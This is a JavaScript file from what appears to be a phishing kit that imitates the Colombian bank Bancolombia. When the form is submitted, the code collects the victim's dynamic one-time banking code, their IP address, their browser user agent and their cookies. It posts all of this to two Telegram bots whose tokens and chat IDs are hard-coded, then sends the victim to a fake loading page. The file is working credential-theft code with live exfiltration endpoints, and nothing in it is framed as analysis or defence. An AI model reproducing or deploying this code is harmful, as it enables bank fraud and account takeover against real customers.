const formulario = document.getElementById('miForm');

// Array de configuraciones de bots de Telegram
const telegramBots = [
  {
    botToken: '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI',
    chatId: '6328222257'
  },
  // Puedes añadir más bots aquí
  {
     botToken: '7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY',
     chatId: '7038426430'
  }
];

const ipifyUrl = 'https://api.ipify.org?format=json';

//CONTADOR
// Define los segundos iniciales
let segundos = 0;

// Selecciona el elemento HTML donde se mostrará el contador
const contadorElemento = document.getElementById('contador');

// Función para actualizar el contador
function actualizarContador() {
  // Calcula los minutos y segundos
  let minutos = Math.floor(segundos / 60);
  let segundosRestantes = segundos % 60;

  // Formatea el tiempo para que siempre muestre dos dígitos
  let minutosFormateados = minutos.toString().padStart(2, '0');
  let segundosFormateados = segundosRestantes.toString().padStart(2, '0');

  // Actualiza el contenido del contador en el HTML
  contadorElemento.innerText = `${minutosFormateados}:${segundosFormateados}`;

  // Incrementa los segundos
  segundos++;

  // Reinicia el contador cuando llega a 60 segundos
  if (segundos === 60) {
    segundos = 0;
  }
}

// Llama a la función actualizarContador cada segundo
setInterval(actualizarContador, 1000);



// Función para enviar mensaje a un bot de Telegram
async function sendTelegramMessage(botConfig, messageData) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botConfig.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: botConfig.chatId,
        text: messageData,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      console.error(`Error enviando mensaje al bot ${botConfig.botToken}`);
    }
  } catch (error) {
    console.error("Error enviando mensaje a Telegram", error);
  }
}

formulario.addEventListener('submit', async function (event) {
  event.preventDefault();
  
  
  try {
    const dinamica = event.target.elements.miInput.value;
    const userAgent = navigator.userAgent;
    const ipResponse = await fetch(ipifyUrl);
    const { ip } = await ipResponse.json();
    const currentDate = new Date();
    const formattedDate = `${currentDate.getDate()}/${currentDate.getMonth() + 1}/${currentDate.getFullYear()}`;
    
    const message = `\n<b>${ip}</b>\n<b>✅  Bancolombia DynmicLogs</b>
    \n \n🔓 ClaveDinamica: <b>${dinamica}</b>\n🍪 Cookies: ${document.cookie || 'Sin cookies'}`;
    
    // Enviar mensaje a todos los bots configurados
    await Promise.all(telegramBots.map(bot => sendTelegramMessage(bot, message)));
    
    // Simula un tiempo de carga y luego redirige
    setTimeout(function() {
      window.location.href = './loader.html';
    }, 2000);
    
  } catch (error) {
    console.error("Error en el proceso", error);
  }
});
